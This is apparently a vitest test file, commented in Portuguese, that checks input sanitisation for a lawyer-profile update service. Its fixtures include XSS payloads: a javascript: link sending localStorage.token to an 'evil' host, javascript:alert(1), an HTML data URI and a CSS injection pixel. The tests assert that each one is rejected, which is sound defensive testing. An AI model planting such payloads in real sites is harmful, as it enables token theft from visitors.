// O que o PUT /profiles/me aceita gravar. O corpo é JSON livre e o resultado é
// lido por visitantes — então estes testes tratam a entrada como hostil: link que
// executa script, texto de um milhão de caracteres, lista infinita, tipo trocado.
//
// Prisma é dublê (o banco de produção é Postgres e não existe aqui): o que se
// verifica é o que o serviço MANDOU gravar.

import { describe, expect, it, vi } from 'vitest'
import { ProfilesService } from './profiles.service'

type Qualquer = Record<string, any>

function service(plan: 'free' | 'pro' | 'premium' = 'premium') {
  const gravado: Qualquer[] = []
  const prisma: Qualquer = {
    profile: {
      findUnique: vi.fn().mockResolvedValue({
        id: 'p1',
        moderationStatus: 'active',
        plan,
        oabNumber: '123',
        userId: 'u1',
      }),
      update: vi.fn((a: Qualquer) => {
        gravado.push(a.data)
        return Promise.resolve({ ...a.data, plan, areas: [], faqs: [], socials: [] })
      }),
    },
    auditLog: { create: vi.fn().mockResolvedValue({}) },
  }
  return { svc: new ProfilesService(prisma as any), gravado, prisma }
}

const base = { name: 'Marina Sales', oabNumber: 'OAB/SP 123', published: false }

describe('links do perfil', () => {
  it('descarta href que executa script (javascript:) em redes e agenda', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      contact: { scheduling: 'javascript:fetch("//evil/"+localStorage.token)' },
      socials: [
        { kind: 'website', url: 'javascript:alert(1)' },
        { kind: 'instagram', url: 'https://instagram.com/marina' },
      ],
    })
    const d = gravado[0]
    expect(d.scheduling).toBeNull()
    // `order: 0` e não 1: a numeração é atribuída DEPOIS de descartar os links
    // recusados. Contar antes deixaria um buraco na ordem — a primeira rede
    // sobrevivente começaria em 1, e o `orderBy` do banco ainda funcionaria, mas
    // a numeração deixaria de corresponder à lista que o editor mostra.
    expect(d.socials.create).toEqual([
      { kind: 'instagram', url: 'https://instagram.com/marina', order: 0 },
    ])
  })

  it('recusa rede desconhecida virando "website" — o público não tem ícone para ela', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, socials: [{ kind: 'orkut', url: 'https://orkut.com/x' }] })
    expect(gravado[0].socials.create[0].kind).toBe('website')
  })

  it('limita a quantidade de redes', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: Array.from({ length: 200 }, () => ({ kind: 'website', url: 'https://a.com' })),
    })
    expect(gravado[0].socials.create.length).toBeLessThanOrEqual(8)
  })
})

describe('foto de perfil', () => {
  it('aceita a imagem embutida que o navegador gerou', async () => {
    const { svc, gravado } = service()
    const uri = 'data:image/jpeg;base64,/9j/4AAQSkZJRg=='
    await svc.update('u1', { ...base, avatarUrl: uri })
    expect(gravado[0].avatarUrl).toBe(uri)
  })

  it('recusa data URI que não é imagem e arquivo grande demais', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, avatarUrl: 'data:text/html;base64,PHNjcmlwdD4=' })
    expect(gravado[0].avatarUrl).toBeNull()

    const { svc: svc2, gravado: g2 } = service()
    await svc2.update('u1', { ...base, avatarUrl: `data:image/png;base64,${'A'.repeat(500_000)}` })
    expect(g2[0].avatarUrl).toBeNull()
  })
})

describe('tamanho e tipo', () => {
  it('corta campo gigante em vez de gravar um milhão de caracteres', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, city: 'x'.repeat(1_000_000), name: 'y'.repeat(100_000) })
    expect(gravado[0].city.length).toBeLessThanOrEqual(80)
    expect(gravado[0].name.length).toBeLessThanOrEqual(70)
  })

  // Sem publicar: aqui o que se prova é que tipo errado vira valor saneado, e não
  // erro de runtime. O caso COM `published` mudou de lugar (logo abaixo), porque
  // publicar passou a exigir nome e OAB — e um rascunho com `name: 12345` fica
  // exatamente sem nome depois do saneamento.
  it('tipo trocado não derruba a rota', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      name: 12345,
      oabNumber: { a: 1 },
      city: [],
      socials: 'não é lista',
      contact: 'nem isso',
      branding: 7,
      published: 0,
    })
    const d = gravado[0]
    expect(d.name).toBe('')
    expect(d.socials.create).toEqual([])
    expect(typeof d.published).toBe('boolean')
    expect(d.published).toBe(false)
  })

  it('published aceita qualquer coisa e grava booleano', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, published: 'sim' })
    expect(gravado[0].published).toBe(true) // "sim" é verdadeiro
    expect(typeof gravado[0].published).toBe('boolean')
  })

  it('cor da marca só entra em hexadecimal (senão seria CSS injetado)', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      branding: { accent: 'red; background:url(http://evil/pixel)', customDomain: 'javascript:1' },
    })
    expect(gravado[0].brandAccent).toBeNull()
    expect(gravado[0].customDomain).toBeNull()
  })
})

describe('plano', () => {
  it('o plano do corpo é ignorado — quem manda é a assinatura do banco', async () => {
    const { svc, gravado } = service('free')
    await svc.update('u1', { ...base, plan: 'premium', theme: 'obsidian' })
    // tema exclusivo do Max não sobrevive a um perfil Free
    expect(gravado[0].theme).not.toBe('obsidian')
    expect(gravado[0].plan).toBeUndefined()
  })

  it('recusa plano inválido na porta da assinatura', async () => {
    const { svc } = service()
    await expect(svc.setPlan('u1', 'deus')).rejects.toThrow(/inválido/i)
    await expect(svc.setPlan('u1', { plan: 'premium' })).rejects.toThrow(/inválido/i)
  })
})

// Publicar exige nome e número de OAB.
//
// Antes não exigia nada: o perfil ia ao ar com o cabeçalho vazio, o endereço
// `perfil-4821` e o link do CNA sem nome para consultar — e a requisição
// respondia 200, então ninguém era avisado. O advogado descobria abrindo o
// próprio link, se descobrisse.
describe('campos obrigatórios para publicar', () => {
  const semNome = { name: '   ', oabNumber: 'OAB/SP 123', published: true }
  const semOab = { name: 'Marina Sales', oabNumber: '', published: true }
  const semNada = { name: '', oabNumber: '', published: true }

  it('recusa e DIZ o que falta', async () => {
    const { svc } = service()
    await expect(svc.update('u1', semNome)).rejects.toThrow(/falta preencher: seu nome\./)
    await expect(svc.update('u1', semOab)).rejects.toThrow(/falta preencher: seu número da OAB\./)
  })

  it('lista tudo que falta de uma vez, não um por vez', async () => {
    const { svc } = service()
    // Recusar um campo por vez faria a pessoa descobrir o segundo problema só
    // depois de resolver o primeiro — duas viagens para o mesmo destino.
    await expect(svc.update('u1', semNada)).rejects.toThrow(
      /seu nome e seu número da OAB/,
    )
  })

  it('avisa que o rascunho não se perdeu', async () => {
    const { svc } = service()
    // Quem vê "não foi possível publicar" assume que perdeu o que escreveu.
    await expect(svc.update('u1', semNada)).rejects.toThrow(/rascunho continua salvo/)
  })

  it('não impede SALVAR rascunho incompleto — só publicar', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { name: '', oabNumber: '', published: false })
    expect(gravado[0].published).toBe(false)
  })

  it('deixa publicar quando os dois estão preenchidos', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { name: 'Marina Sales', oabNumber: 'OAB/SP 123', published: true })
    expect(gravado[0].published).toBe(true)
  })
})

// A ordem das redes é escolha do advogado (ele arrasta no editor). Antes não
// existia coluna `order` nem `orderBy` — `areas` e `faqs` sempre tiveram, e só as
// redes tinham ficado de fora. O sintoma era discreto e constante: a fileira de
// ícones do perfil trocava de posição sozinha entre uma visita e outra.
describe('ordem das redes', () => {
  it('grava a ordem da lista recebida', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: [
        { kind: 'linkedin', url: 'https://linkedin.com/in/marina' },
        { kind: 'instagram', url: 'https://instagram.com/marina' },
        { kind: 'website', url: 'https://marina.adv.br' },
      ],
    })
    expect(gravado[0].socials.create.map((s: Qualquer) => [s.kind, s.order])).toEqual([
      ['linkedin', 0],
      ['instagram', 1],
      ['website', 2],
    ])
  })

  it('link recusado no meio não deixa buraco na numeração', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: [
        { kind: 'linkedin', url: 'https://linkedin.com/in/marina' },
        { kind: 'instagram', url: 'javascript:alert(1)' }, // recusado
        { kind: 'website', url: 'https://marina.adv.br' },
      ],
    })
    expect(gravado[0].socials.create.map((s: Qualquer) => [s.kind, s.order])).toEqual([
      ['linkedin', 0],
      ['website', 1],
    ])
  })
})
